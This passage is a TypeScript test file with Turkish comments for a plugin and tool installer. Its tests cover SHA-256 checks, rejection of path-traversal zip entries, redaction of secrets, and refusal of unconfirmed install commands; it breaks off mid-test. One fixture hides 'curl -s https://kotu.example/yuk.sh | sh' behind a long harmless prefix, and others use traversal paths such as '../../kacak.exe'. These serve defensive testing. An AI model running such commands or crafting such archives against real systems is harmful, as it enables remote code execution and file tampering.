// Fuber Geliştirici Paketi kurucusu (Görev 29, K18; src/main/claudecode/eklenti-kurucu.ts) — SAHTE claude / uv / graphify / yükleyici
// (scripts/dev/sahte-*.mjs) ve 127.0.0.1'de SAHTE uv arşivi sunucusuyla. Gerçek claude.exe, gerçek uv/pip, gerçek indirme, ağ ve kullanıcının
// ~/.claude'u YOK: ev (USERPROFILE/HOME) ve FUBER_CLAUDE_DIZIN her senaryoda geçici. Denetlenenler: SHA-256 uyuşmazlığında açmama; yol
// geçişli arşivi reddetme; kurulu olanı atlama; bir eklenti düşünce ötekilerin sürmesi; kurulum komutu ONAYSIZ çalışmaz (asla -y);
// Claude Code yokken bekleme ve kurulunca kaldığı yerden sürme; graphifyy==0.9.95 ve uv'nin uygulama veri klasöründe kalması.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import crypto from 'node:crypto';
import { zipOlustur, sahteUvSunucusu, sahteUvZip, sha256 } from '../scripts/dev/sahte-zip.mjs';

const kok = path.resolve(import.meta.dirname, '..');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'fuber-eklenti-'));
const node = process.execPath;
const betik = (ad: string) => path.join(kok, 'scripts', 'dev', ad);
process.env.FUBER_CLAUDE_KOMUT = JSON.stringify([node, betik('sahte-claude.mjs')]);
process.env.FUBER_UV_KOMUT = JSON.stringify([node, betik('sahte-uv.mjs')]);
process.env.FUBER_GRAPHIFY_KOMUT = JSON.stringify([node, betik('sahte-graphify.mjs')]);
for (const k of Object.keys(process.env)) if (/^SAHTE_|^FUBER_SAHTE_|^FUBER_SIR_|^FUBER_CC_YUKLEYICI|^FUBER_CLAUDE_KURULU/.test(k)) delete process.env[k];

const m = await import('../src/main/claudecode/eklenti-kurucu.ts');
const { EklentiKurucu, kurulumSonucuCoz, katalogTanimliMi, eklentiListesiCoz, katalogListesiCoz, mcpListesiCoz, beceriBasligi, iletiTemizle, zipCikar, uvListesindeGraphify, uvKomutu, graphifyKomutu, graphifyYolu, yukleyiciKomutu, calisanSurecler, graphifyDenetle } = m;
const { varsayilanSecim, UV_ARSIVI } = await import('../src/shared/cc-eklentiler.ts');
type Kurucu = InstanceType<typeof EklentiKurucu>;

const sunucu = await sahteUvSunucusu();
after(async () => { await sunucu.kapat(); fs.rmSync(tmp, { recursive: true, force: true }); });

const uyu = (ms: number) => new Promise((r) => setTimeout(r, ms));
async function bekleKosul(f: () => boolean, ms = 30_000, ne = 'koşul'): Promise<void> {
  const son = Date.now() + ms;
  while (Date.now() < son) { if (f()) return; await uyu(25); }
  throw new Error(`zaman aşımı: ${ne}`);
}
const satirlar = (f: string) => (fs.existsSync(f) ? fs.readFileSync(f, 'utf8').split('\n').filter(Boolean).map((s) => JSON.parse(s)) : []);

let sayac = 0;
/** Taze senaryo: geçici ev + ~/.claude + uygulama veri klasörü + kayıt dosyaları; ortam değişkenleri (sahte süreçler devralır). */
function senaryo(ek: Record<string, string> = {}, secenek: Partial<ConstructorParameters<typeof EklentiKurucu>[0]> = {}) {
  const d = path.join(tmp, `s${++sayac}`);
  const ev = path.join(d, 'ev');
  const claude = path.join(ev, '.claude');
  const veri = path.join(d, 'veri');
  fs.mkdirSync(claude, { recursive: true });
  for (const k of Object.keys(process.env)) if (/^SAHTE_|^FUBER_SAHTE_/.test(k)) delete process.env[k];
  Object.assign(process.env, {
    USERPROFILE: ev, HOME: ev, FUBER_CLAUDE_DIZIN: claude,
    FUBER_SAHTE_CLAUDE_KAYIT: path.join(d, 'claude.jsonl'), FUBER_SAHTE_UV_KAYIT: path.join(d, 'uv.jsonl'), FUBER_SAHTE_GRAPHIFY_KAYIT: path.join(d, 'graphify.jsonl'),
    ...ek,
  });
  const olaylar: unknown[] = [];
  const bildirimler: string[] = [];
  const cop: string[] = [];
  const k: Kurucu = new EklentiKurucu({
    veriDizini: path.join(veri, 'claudecode'), araclarDizini: path.join(veri, 'araclar'), claudeDizini: () => claude,
    olay: (x) => olaylar.push(x), bildir: (b, t) => bildirimler.push(`${b}: ${t}`),
    cop: async (y) => { cop.push(y); fs.rmSync(y, { recursive: true, force: true }); },
    uvKaynagi: { url: sunucu.url, sha256: sunucu.sha256 }, izlemeAraligiMs: 80, ...secenek,
  });
  const claudeKayit = () => satirlar(path.join(d, 'claude.jsonl')).map((x: { argv: string[] }) => x.argv);
  const bitti = () => bekleKosul(() => { const p = k.paketDurumu(); return !p.calisiyor && !p.ogeler.some((o) => o.hal === 'sirada' || o.hal === 'kuruluyor'); }, 60_000, 'paket bitti');
  return { d, ev, claude, veri, k, olaylar, bildirimler, cop, claudeKayit, uvKayit: () => satirlar(path.join(d, 'uv.jsonl')), graphifyKayit: () => satirlar(path.join(d, 'graphify.jsonl')), bitti };
}
const hal = (k: Kurucu, id: string) => k.paketDurumu().ogeler.find((o) => o.id === id);
const asla_y = (l: string[][]) => assert.ok(!l.some((a) => a.includes('-y') || a.includes('--yes')), `körlemesine -y verildi: ${JSON.stringify(l.filter((a) => a.includes('-y') || a.includes('--yes')))}`);

// ── Saf ayrıştırıcılar ─────────────────────────────────────────────────────────────────────────────────────────────────────
const cikti = (stdout: string, kod: number | null = 0, zamanAsimi = false) => ({ kod, stdout, stderr: '', zamanAsimi });
const gosterilen = (g: Record<string, unknown>) => cikti(JSON.stringify({ command: 'install', outcome: 'failed', failureCode: 'command_source_refused', message: 'Review', shownCommand: g }), 1);

test('kurulumSonucuCoz: ok / already / shownCommand → onay (kimlik, kip, katalog sürümü saklanır) / failed → hata / zaman aşımı / JSON yok', () => {
  const c = cikti;
  const ID = 'x@k';
  assert.equal(kurulumSonucuCoz(c('Installing…\n{"command":"install","outcome":"ok","message":"Successfully installed"}\n'), ID).tur, 'tamam');
  assert.equal(kurulumSonucuCoz(c('{"outcome":"failed","alreadyInGoalState":true,"message":"x"}'), ID).tur, 'tamam');
  const sha = 'a'.repeat(64);
  const o = kurulumSonucuCoz(gosterilen({ kind: 'command_source', pluginId: ID, command: 'npm i -g x', mode: 'global', catalogRevision: 'r7', sha256: sha.toUpperCase() }), ID);
  assert.deepEqual(o.tur === 'onay' && o.onay, { komut: 'npm i -g x', sha256: sha, pluginId: ID, tur: 'command_source', mod: 'global', katalogSurumu: 'r7' });
  const h = kurulumSonucuCoz(c('{"outcome":"failed","failureCode":"download_failed","message":"\\u001b[31mindirilemedi\\u001b[0m"}', 1), ID);
  assert.deepEqual(h, { tur: 'hata', ileti: 'indirilemedi', kod: 'download_failed' });
  assert.equal(kurulumSonucuCoz(c('', null, true), ID).tur, 'hata');
  assert.match((kurulumSonucuCoz(c('saçma', 3), ID) as { ileti: string }).ileti, /çıkış kodu 3/);
  // Bozuk sha256 → onay sayılmaz (hata).
  assert.equal(kurulumSonucuCoz(c(`{"outcome":"failed","shownCommand":{"pluginId":"${ID}","command":"x","sha256":"kisa"}}`, 1), ID).tur, 'hata');
});

// Düzeltme turu 1, madde 1: kullanıcının gördüğü TAM olarak --accept-command'ın onayladığıdır.
test('kurulumSonucuCoz: 4.000 karakterlik zararsız önek + yük → onay SUNULMAZ (kısaltılmaz), "kurulmadı"; arşiv adresi de sınırda', () => {
  const ID = 'x@claude-plugins-official';
  const komut = `echo ${'a'.repeat(4000)} && curl -s https://kotu.example/yuk.sh | sh`;
  const r = kurulumSonucuCoz(gosterilen({ kind: 'command_source', pluginId: ID, command: komut, mode: 'global', catalogRevision: 'r', sha256: 'b'.repeat(64) }), ID);
  assert.equal(r.tur, 'hata', `uzun komut onaya sunuldu: ${JSON.stringify(r).slice(0, 200)}`);
  assert.equal((r as { ileti: string }).ileti, 'Bu eklentinin kurulum komutu burada gösterilemeyecek kadar uzun; kurulmadı.');
  assert.equal((r as { kod?: string }).kod, 'komut_cok_uzun');
  // Sınırın tam altı: TAMAMI saklanır (kısaltma yok).
  const sinir = `npm i ${'b'.repeat(994)}`;
  assert.equal(sinir.length, 1000);
  const t = kurulumSonucuCoz(gosterilen({ kind: 'command_source', pluginId: ID, command: sinir, sha256: 'b'.repeat(64) }), ID);
  assert.equal(t.tur === 'onay' && t.onay.komut, sinir);
  // archiveUrl de kısaltılmadan gösterilir; çok uzunsa onay yok.
  const a = kurulumSonucuCoz(gosterilen({ kind: 'entry_helper', pluginId: ID, command: 'node h.js', archiveUrl: `https://o.example/${'c'.repeat(1200)}.tgz`, sha256: 'b'.repeat(64) }), ID);
  assert.equal(a.tur, 'hata');
});

test('kurulumSonucuCoz: shownCommand.pluginId istenen eklenti değilse (ya da yoksa) onay SUNULMAZ; entry_helper\'ın archiveUrl\'i saklanır', () => {
  const ID = 'context7@claude-plugins-official';
  const baska = kurulumSonucuCoz(gosterilen({ kind: 'command_source', pluginId: 'baska@claude-plugins-official', command: 'npm i -g x', sha256: 'c'.repeat(64) }), ID);
  assert.equal(baska.tur, 'hata');
  assert.equal((baska as { kod?: string }).kod, 'komut_kimligi_tutmadi');
  assert.match((baska as { ileti: string }).ileti, /başka bir eklentiye ait.*kurulmadı/);
  assert.equal(kurulumSonucuCoz(gosterilen({ kind: 'command_source', command: 'npm i -g x', sha256: 'c'.repeat(64) }), ID).tur, 'hata', 'kimliksiz komut');
  assert.equal(kurulumSonucuCoz(gosterilen({ kind: 'command_source', pluginId: 'context7', command: 'npm i -g x', sha256: 'c'.repeat(64) }), ID).tur, 'hata', 'kataloğu eksik kimlik');
  const e = kurulumSonucuCoz(gosterilen({ kind: 'entry_helper', pluginId: ID, command: 'node ./h.js', archiveUrl: 'https://ornek.example/a.tgz', catalogRevision: 'rev-9', sha256: 'd'.repeat(64) }), ID);
  assert.deepEqual(e.tur === 'onay' && e.onay, { komut: 'node ./h.js', sha256: 'd'.repeat(64), pluginId: ID, tur: 'entry_helper', arsivAdresi: 'https://ornek.example/a.tgz', katalogSurumu: 'rev-9' });
});

// Birleşim turu sertleştirmesi (2a, 2c): kartta gösterilen hiçbir alan kısaltılmaz; biçim dışı shownCommand reddedilir.
test('sertleştirme: katalog sürümü / kip sınırı aşarsa KISALTILMAZ, reddedilir; 21 satırlık komut reddedilir (20 kabul); bilinmeyen anahtar / tür / alan türü reddedilir', () => {
  const ID = 'x@claude-plugins-official';
  const sha = 'f'.repeat(64);
  const temel = { kind: 'command_source', pluginId: ID, command: 'npm i -g x', mode: 'global', catalogRevision: 'r1', sha256: sha };
  const sonuc = (g: Record<string, unknown>) => kurulumSonucuCoz(gosterilen(g), ID) as { tur: string; ileti?: string; kod?: string; onay?: { katalogSurumu?: string; mod?: string; tur?: string } };
  assert.equal(sonuc(temel).tur, 'onay');
  assert.equal(sonuc(temel).onay?.tur, 'command_source', 'tür (kind) saklanır ve kartta gösterilir');
  // Katalog sürümü ve kip: 200 karakter kabul, 201 → red (eskiden .slice(0, 200) ile sessizce kısaltılıyordu).
  assert.equal(sonuc({ ...temel, catalogRevision: 'r'.repeat(200) }).onay?.katalogSurumu?.length, 200);
  const uzunRev = sonuc({ ...temel, catalogRevision: `${'r'.repeat(200)}-gizli-kuyruk` });
  assert.deepEqual([uzunRev.tur, uzunRev.kod, uzunRev.ileti], ['hata', 'alan_cok_uzun', 'Bu eklentinin kurulum bilgisi burada gösterilemeyecek kadar uzun; kurulmadı.']);
  assert.equal(sonuc({ ...temel, mode: 'm'.repeat(201) }).kod, 'alan_cok_uzun');
  assert.equal(sonuc({ ...temel, catalogRevision: 12345 }).onay?.katalogSurumu, '12345');
  // Satır sınırı: 20 satır kabul, 21 → red.
  const satirli = (n: number) => Array.from({ length: n }, (_, i) => `echo ${i}`).join('\n');
  assert.equal(sonuc({ ...temel, command: satirli(20) }).tur, 'onay');
  const s21 = sonuc({ ...temel, command: satirli(21) });
  assert.deepEqual([s21.tur, s21.kod], ['hata', 'komut_cok_uzun']);
  // Biçim: bilinmeyen anahtar, bilinmeyen tür, yanlış türde alan, türüne ait olmayan alan, nesne olmayan shownCommand.
  const bicim = (g: unknown) => (kurulumSonucuCoz(cikti(JSON.stringify({ outcome: 'failed', shownCommand: g }), 1), ID) as { kod?: string }).kod;
  assert.equal(bicim({ ...temel, env: { PATH: 'C:/kotu' } }), 'komut_bicimi_bilinmiyor', 'bilinmeyen anahtar');
  assert.equal(bicim({ ...temel, kind: 'shell_hook' }), 'komut_bicimi_bilinmiyor', 'bilinmeyen tür');
  assert.equal(bicim({ ...temel, kind: undefined }), 'komut_bicimi_bilinmiyor', 'türsüz');
  assert.equal(bicim({ ...temel, command: ['npm', 'i'] }), 'komut_bicimi_bilinmiyor', 'dizi komut');
  assert.equal(bicim({ ...temel, archiveUrl: 'https://o.example/a.tgz' }), 'komut_bicimi_bilinmiyor', 'command_source\'ta archiveUrl (özet kapsamaz)');
  assert.equal(bicim({ kind: 'entry_helper', pluginId: ID, command: 'node h.js', mode: 'x', archiveUrl: 'https://o.example/a.tgz', sha256: sha }), 'komut_bicimi_bilinmiyor', 'entry_helper\'da mode');
  assert.equal(bicim({ kind: 'entry_helper', pluginId: ID, command: 'node h.js', sha256: sha }), 'komut_bicimi_bilinmiyor', 'arşivsiz entry_helper');
  assert.equal(bicim('npm i -g x'), 'komut_bicimi_bilinmiyor', 'nesne olmayan shownCommand');
  assert.equal(sonuc({ ...temel, acceptCommandMatched: false }).tur, 'onay', 'Claude Code\'un kendi acceptCommandMatched alanı bilinir');
});

// Düzeltme turu 1, madde 11: denetleyicinin gerçek 2.1.310 ikilisinde doğruladığı biçim (yalnız alan adları; değerler örnek).
test('gerçek biçim (2.1.310): plugin list --json ve --available --json alanlarıyla ayrıştırma', () => {
  const kurulu = [
    { id: 'context7@claude-plugins-official', version: '1.2.0', scope: 'user', enabled: true, installPath: 'C:/Kullanicilar/x/.claude/plugins/cache/claude-plugins-official/context7/1.2.0', installedAt: '2026-10-01T10:00:00.000Z', lastUpdated: '2026-10-20T10:00:00.000Z', projectEnabled: false, mcpServers: { context7: { type: 'stdio', command: 'npx' } }, errors: [], errorDetails: [] },
    { id: 'bozuk@topluluk', version: '0.1.0', scope: 'project', enabled: false, installPath: 'C:/p/.claude/plugins/bozuk', installedAt: '2026-10-02T10:00:00.000Z', lastUpdated: '2026-10-02T10:00:00.000Z', projectEnabled: true, mcpServers: {}, errors: ['manifest okunamadı'], errorDetails: [{ message: 'plugin.json: geçersiz alan' }] },
  ];
  const e = eklentiListesiCoz(JSON.stringify(kurulu))!;
  assert.deepEqual(e.map((x) => ({ id: x.id, ad: x.ad, katalog: x.katalog, surum: x.surum, kapsam: x.kapsam, etkin: x.etkin, mcp: x.mcp, hatalar: x.hatalar, paketteMi: x.paketteMi })), [
    { id: 'context7@claude-plugins-official', ad: 'Context7', katalog: 'claude-plugins-official', surum: '1.2.0', kapsam: 'user', etkin: true, mcp: ['context7'], hatalar: [], paketteMi: true },
    { id: 'bozuk@topluluk', ad: 'bozuk', katalog: 'topluluk', surum: '0.1.0', kapsam: 'project', etkin: false, mcp: [], hatalar: ['manifest okunamadı', 'plugin.json: geçersiz alan'], paketteMi: false },
  ]);
  const mevcut = { installed: kurulu, available: [
    { pluginId: 'context7@claude-plugins-official', name: 'context7', description: 'Güncel belgeler (MCP)', marketplaceName: 'claude-plugins-official', source: { source: 'github', repo: 'upstash/context7' }, installCount: 120345, version: '1.2.0' },
    { pluginId: 'linear@claude-plugins-official', name: 'linear', description: 'Linear MCP', marketplaceName: 'claude-plugins-official', source: './plugins/linear', installCount: 900, version: '0.4.1' },
    { pluginId: 'araci@topluluk', name: 'araci', description: 'Topluluk aracı', marketplaceName: 'topluluk', source: { source: 'url', url: 'https://ornek.example/araci.git' }, installCount: 3, version: '0.1.0' },
  ] };
  const k = katalogListesiCoz(JSON.stringify(mevcut))!;
  assert.deepEqual(k.map((x) => [x.id, x.ad, x.katalog, x.kurulu, x.surum, x.kurulumSayisi, x.kaynak]), [
    ['context7@claude-plugins-official', 'context7', 'claude-plugins-official', true, '1.2.0', 120345, 'upstash/context7'],
    ['linear@claude-plugins-official', 'linear', 'claude-plugins-official', false, '0.4.1', 900, './plugins/linear'],
    ['araci@topluluk', 'araci', 'topluluk', false, '0.1.0', 3, 'https://ornek.example/araci.git'],
  ]);
  // Hoşgörü: eksik alanlı öğe atlanmaz/düşmez; pluginId yoksa name@marketplaceName; bozuk JSON → null.
  assert.deepEqual(katalogListesiCoz('{"installed":[],"available":[{"name":"z","marketplaceName":"m"},{"description":"adsız"}]}')!.map((x) => x.id), ['z@m']);
  assert.equal(katalogListesiCoz('bozuk'), null);
  assert.equal(eklentiListesiCoz('{"installed":[{"id":"a@b"}]}')!.length, 1);
});

test('katalog, eklenti, katalog (--available), MCP ve beceri ayrıştırıcıları; sır gibi dizgiler iletiden atılır', () => {
  assert.equal(katalogTanimliMi('[{"name":"claude-plugins-official","source":"github","repo":"anthropics/claude-plugins-official"}]'), true);
  assert.equal(katalogTanimliMi('[{"name":"baska"}]'), false);
  assert.equal(katalogTanimliMi('bozuk'), null);
  const e = eklentiListesiCoz('[{"id":"context7@claude-plugins-official","version":"1.0.0","scope":"user","enabled":false,"installPath":"C:/x","mcpServers":{"context7":{}},"errors":[{"message":"x bozuk"}]},{"id":"benim@yerel","enabled":true}]')!;
  assert.equal(e.length, 2);
  assert.deepEqual({ id: e[0].id, etkin: e[0].etkin, mcp: e[0].mcp, hatalar: e[0].hatalar, paketteMi: e[0].paketteMi, kapsam: e[0].kapsam }, { id: 'context7@claude-plugins-official', etkin: false, mcp: ['context7'], hatalar: ['x bozuk'], paketteMi: true, kapsam: 'user' });
  assert.equal(e[1].paketteMi, false);
  const k = katalogListesiCoz('{"installed":[{"id":"a@k"}],"available":[{"pluginId":"a@k","name":"a","description":"A eklentisi","marketplaceName":"k","installCount":9},{"name":"b","marketplaceName":"k","description":"B","version":"2"}]}')!;
  assert.deepEqual(k.map((x) => [x.id, x.kurulu, x.aciklama, x.surum ?? '']), [['a@k', true, 'A eklentisi', ''], ['b@k', false, 'B', '2']]);
  const mcp = mcpListesiCoz('Checking MCP server health...\n\nfs: npx -y @x/fs - ✓ Connected\nplugin:context7:context7: npx -y c7 - ✓ Connected\neski: node e.js - ✗ Failed to connect\nclaude.ai Gmail: https://x - ! Needs authentication\n');
  assert.deepEqual(mcp.map((s) => [s.ad, s.hal, s.kaynak, s.kaldirilabilir]), [['fs', 'bagli', 'kullanici', true], ['plugin:context7:context7', 'bagli', 'eklenti', false], ['eski', 'hata', 'kullanici', true], ['claude.ai Gmail', 'bekliyor', 'claude.ai', false]]);
  assert.deepEqual(beceriBasligi('---\nname: kod-incele\ndescription: >\n  Uzun açıklama\n  iki satır\n---\n# x'), { ad: 'kod-incele', aciklama: 'Uzun açıklama iki satır' });
  assert.deepEqual(beceriBasligi('---\nname: "a"\ndescription: \'Kısa\'\n---'), { ad: 'a', aciklama: 'Kısa' });
  assert.equal(iletiTemizle('anahtar sk-ant-' + 'api03-ABCDEFGHIJ ve ghp_' + '1234567890abcdef görünmez'), 'anahtar ••• ve ••• görünmez');
  assert.equal(uvListesindeGraphify('graphifyy v0.9.95\n- graphify.exe\n'), true);
  assert.equal(uvListesindeGraphify('graphify v1.0\n'), false, 'tek y olan sahte paket sayılmaz');
});

// ── Güvenli zip açıcı ──────────────────────────────────────────────────────────────────────────────────────────────────────
test('zipCikar: yalnız izinli adlar (kökte ya da tek klasörde) dosya adıyla yazılır; yol geçişli arşiv TAMAMEN reddedilir; CRC denetlenir', () => {
  const d = path.join(tmp, 'zip');
  fs.mkdirSync(d, { recursive: true });
  const z1 = path.join(d, 'iyi.zip');
  fs.writeFileSync(z1, zipOlustur([{ ad: 'uv-x86_64/uv.exe', veri: 'UV' }, { ad: 'uv-x86_64/uvx.exe', veri: 'UVX' }, { ad: 'README.md', veri: 'oku' }, { ad: 'a/b/uvw.exe', veri: 'derin' }]));
  const h1 = path.join(d, 'cikis1');
  assert.deepEqual(zipCikar(z1, h1, ['uv.exe', 'uvx.exe', 'uvw.exe']), ['uv.exe', 'uvx.exe']);
  assert.deepEqual(fs.readdirSync(h1).sort(), ['uv.exe', 'uvx.exe']);
  assert.equal(fs.readFileSync(path.join(h1, 'uv.exe'), 'utf8'), 'UV');
  // Yol geçişi: "../" girişi olan arşivden HİÇBİR şey yazılmaz (izinli uv.exe dahil).
  const z2 = path.join(d, 'kotu.zip');
  fs.writeFileSync(z2, zipOlustur([{ ad: 'uv.exe', veri: 'UV' }, { ad: '../../kacak.exe', veri: 'KÖTÜ' }]));
  const h2 = path.join(d, 'cikis2');
  assert.throws(() => zipCikar(z2, h2, ['uv.exe', 'kacak.exe']), /güvensiz bir yol/);
  assert.ok(!fs.existsSync(h2) || fs.readdirSync(h2).length === 0, 'reddedilen arşivden dosya yazıldı');
  assert.ok(!fs.existsSync(path.join(d, 'kacak.exe')) && !fs.existsSync(path.join(tmp, 'kacak.exe')));
  for (const ad of ['C:/Windows/uv.exe', '/etc/uv.exe', 'a\\..\\uv.exe']) {
    const z = path.join(d, 'k3.zip');
    fs.writeFileSync(z, zipOlustur([{ ad, veri: 'x' }]));
    assert.throws(() => zipCikar(z, path.join(d, 'c3'), ['uv.exe']), /güvensiz/, ad);
  }
  // Bozuk veri (CRC tutmaz) yazılmaz.
  const ham = zipOlustur([{ ad: 'uv.exe', veri: 'AAAAAAAAAAAAAAAAAAAA' }], { yontem: 0 });
  ham[30 + 'uv.exe'.length + 3] ^= 0xff;
  const z4 = path.join(d, 'crc.zip');
  fs.writeFileSync(z4, ham);
  assert.throws(() => zipCikar(z4, path.join(d, 'c4'), ['uv.exe']), /CRC/);
  assert.ok(!fs.existsSync(path.join(d, 'c4', 'uv.exe')));
  assert.equal(zlib.crc32 !== undefined, true);
});

// ── uv: SHA-256 eşleşmesi / uyuşmazlığı ──────────────────────────────────────────────────────────────────────────────────────
test('uv: sahte sunucudan iner, SHA-256 tutunca açılır (uv.exe, uvx.exe, uvw.exe; LICENSE değil); ikinci çağrı yeniden indirmez', async () => {
  const s = senaryo();
  const once = sunucu.istekler.length;
  const exe = await s.k.uvHazirla();
  assert.equal(exe, path.join(s.veri, 'araclar', 'uv', '0.13.5', 'uv.exe'));
  assert.deepEqual(fs.readdirSync(path.dirname(exe)).sort(), ['.dogrulandi', 'uv.exe', 'uvw.exe', 'uvx.exe']);
  assert.equal(fs.readFileSync(path.join(path.dirname(exe), '.dogrulandi'), 'utf8'), sunucu.sha256);
  assert.equal(sunucu.istekler.length, once + 1);
  assert.deepEqual(fs.readdirSync(path.join(s.veri, 'araclar', 'indirme')), [], 'indirilen arşiv açıldıktan sonra silinir');
  await s.k.uvHazirla();
  assert.equal(sunucu.istekler.length, once + 1, 'doğrulanmış uv yeniden indirilmez');
});

test('uv: SHA-256 TUTMAZSA arşiv AÇILMAZ — açık hata, uv klasörü yok, arşiv silinir; Graphify düşer, katalog eklentileri sürer', async () => {
  sunucu.bozukYap();
  try {
    const s = senaryo();
    await assert.rejects(() => s.k.uvHazirla(), /SHA-256 özeti tutmadı; hiçbir şey açılmadı/);
    assert.ok(!fs.existsSync(path.join(s.veri, 'araclar', 'uv', '0.13.5')), 'uv klasörü oluştu');
    assert.deepEqual(fs.readdirSync(path.join(s.veri, 'araclar', 'indirme')), []);
    // Paket içinde: Graphify hata, öteki seçilen kurulur.
    s.k.paketBaslat(['graphify', 'context7']);
    await s.bitti();
    assert.equal(hal(s.k, 'graphify')?.hal, 'hata');
    assert.match(hal(s.k, 'graphify')?.ileti ?? '', /SHA-256/);
    assert.equal(hal(s.k, 'context7')?.hal, 'kuruldu');
    assert.equal(s.uvKayit().length, 0, 'doğrulanmamış uv ÇALIŞTIRILDI');
  } finally { sunucu.duzelt(); }
});

test('TEST GÜVENLİĞİ: testte uv yalnız 127.0.0.1\'den iner; sahtesi verilmemiş uv / graphify / yükleyici yüksek sesle düşer', async () => {
  const kayit: string[] = [];
  const asil = globalThis.fetch;
  globalThis.fetch = (async (u: unknown) => { kayit.push(String(u)); throw new Error('ağ yok'); }) as typeof fetch;
  try {
    const s = senaryo({}, { uvKaynagi: { url: 'https://github.com/astral-sh/uv/releases/download/0.13.5/uv-x86_64-pc-windows-msvc.zip', sha256: 'a'.repeat(64) } });
    await assert.rejects(() => s.k.uvHazirla(), /TEST GÜVENLİĞİ/);
    assert.deepEqual(kayit, [], 'gerçek adrese istek gitti');
  } finally { globalThis.fetch = asil; }
  const yedek = { uv: process.env.FUBER_UV_KOMUT, g: process.env.FUBER_GRAPHIFY_KOMUT };
  delete process.env.FUBER_UV_KOMUT; delete process.env.FUBER_GRAPHIFY_KOMUT;
  try {
    assert.throws(() => uvKomutu('C:/x/uv.exe'), /TEST GÜVENLİĞİ/);
    assert.throws(() => graphifyKomutu(null), /TEST GÜVENLİĞİ/);
    assert.throws(() => yukleyiciKomutu(), /TEST GÜVENLİĞİ/);
    const s = senaryo();
    const r = s.k.ccKur();
    assert.equal(r.tamam, false);
    assert.match(r.hata ?? '', /TEST GÜVENLİĞİ/);
  } finally { process.env.FUBER_UV_KOMUT = yedek.uv; process.env.FUBER_GRAPHIFY_KOMUT = yedek.g; }
});

// ── Paket ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
test('paket (★ dokuz): katalog yoksa eklenir; sekiz katalog eklentisi -s user --json ile, Graphify uv + graphifyy==0.9.95 + graphify install --platform windows; uv ortamı uygulama veri klasöründe, sorgu günlüğü kapalı; asla -y', async () => {
  const s = senaryo({ SAHTE_CC_KATALOG: 'yok' });
  const d = s.k.paketBaslat(varsayilanSecim());
  assert.equal(d.adimGoruldu, true);
  assert.deepEqual(d.ogeler.map((o) => o.id), varsayilanSecim());
  await s.bitti();
  const p = s.k.paketDurumu();
  assert.deepEqual(p.ogeler.map((o) => [o.id, o.hal]), varsayilanSecim().map((id) => [id, 'kuruldu']), JSON.stringify(p.ogeler));
  const c = s.claudeKayit();
  const ekle = c.findIndex((a) => a.join(' ') === 'plugin marketplace add anthropics/claude-plugins-official --scope user');
  assert.ok(ekle >= 0, 'katalog eklenmedi');
  const kurulumlar = c.filter((a) => a[0] === 'plugin' && a[1] === 'install');
  assert.equal(kurulumlar.length, 8);
  for (const a of kurulumlar) { assert.match(a[2], /^[a-z0-9-]+@claude-plugins-official$/); assert.deepEqual(a.slice(3), ['-s', 'user', '--json']); }
  assert.ok(c.findIndex((a) => a[1] === 'install') > ekle, 'katalog kurulumlardan önce eklenmeli');
  asla_y(c);
  const uv = s.uvKayit();
  const kur = uv.find((x: { argv: string[] }) => x.argv[0] === 'tool' && x.argv[1] === 'install');
  assert.deepEqual(kur.argv, ['tool', 'install', 'graphifyy==0.9.95']);
  const araclar = path.join(s.veri, 'araclar');
  for (const k of ['UV_TOOL_DIR', 'UV_PYTHON_INSTALL_DIR', 'UV_CACHE_DIR']) assert.ok(String(kur[k]).startsWith(araclar), `${k} uygulama veri klasöründe değil: ${kur[k]}`);
  assert.equal(kur.UV_TOOL_BIN_DIR, undefined, 'komut kalıbı ~/.local/bin\'de kalmalı (Claude Code\'un kancası bulsun)');
  assert.equal(kur.GRAPHIFY_QUERY_LOG_DISABLE, '1');
  const g = s.graphifyKayit();
  assert.deepEqual(g.map((x: { argv: string[] }) => x.argv), [['install', '--platform', 'windows']]);
  assert.equal(g[0].GRAPHIFY_QUERY_LOG_DISABLE, '1');
  assert.equal(g[0].yol, path.join(s.ev, '.local', 'bin'), 'graphify install PATH\'in başında uv\'nin komut klasörü');
  assert.ok(fs.existsSync(path.join(s.claude, 'skills', 'graphify', 'SKILL.md')));
  // Günlük: komutlar yazıldı, sır yok.
  const gunluk = fs.readFileSync(p.gunluk, 'utf8');
  assert.match(gunluk, /plugin install superpowers@claude-plugins-official -s user --json → çıkış 0/);
  assert.match(gunluk, /uv 0\.13\.5 doğrulandı ve açıldı/);
  assert.doesNotMatch(gunluk, /sk-ant|SAHTE-ASLA/);
  assert.ok(s.bildirimler.some((b) => /Geliştirici araçların hazır: 9 araç hazır/.test(b)), JSON.stringify(s.bildirimler));
  assert.ok(s.olaylar.length > 5, 'ilerleme olayı yok');
  // Yeniden çalıştırılabilir: kurulu olan atlanır (kurulum komutu yeniden çalışmaz, uv yeniden kurmaz).
  const kurOnce = s.claudeKayit().filter((a) => a[1] === 'install').length, uvOnce = s.uvKayit().length;
  s.k.paketBaslat(varsayilanSecim());
  await s.bitti();
  assert.deepEqual(s.k.paketDurumu().ogeler.map((o) => o.hal), varsayilanSecim().map(() => 'kurulu'));
  assert.equal(s.claudeKayit().filter((a) => a[1] === 'install').length, kurOnce, 'kurulu eklenti yeniden kuruldu');
  assert.equal(s.uvKayit().length, uvOnce, 'kurulu Graphify yeniden kuruldu');
});

test('bir eklenti düşerse ötekiler sürer; durum diske yazılır ve yeni örnek "kuruluyor"u kuyruğa döndürür', async () => {
  const s = senaryo({ SAHTE_CC_DUSEN: 'code-review' });
  s.k.paketBaslat(['code-review', 'superpowers', 'feature-dev']);
  await s.bitti();
  assert.equal(hal(s.k, 'code-review')?.hal, 'hata');
  assert.match(hal(s.k, 'code-review')?.ileti ?? '', /indirilemedi/);
  assert.equal(hal(s.k, 'superpowers')?.hal, 'kuruldu');
  assert.equal(hal(s.k, 'feature-dev')?.hal, 'kuruldu');
  assert.ok(s.bildirimler.some((b) => /1 araç kurulamadı/.test(b)));
  const dosya = path.join(s.veri, 'claudecode', 'gelistirici-paketi.json');
  const kayit = JSON.parse(fs.readFileSync(dosya, 'utf8'));
  kayit.ogeler.push({ id: 'context7', hal: 'kuruluyor' });
  fs.writeFileSync(dosya, JSON.stringify(kayit));
  const yeni = new EklentiKurucu({ veriDizini: path.join(s.veri, 'claudecode'), araclarDizini: path.join(s.veri, 'araclar'), claudeDizini: () => s.claude });
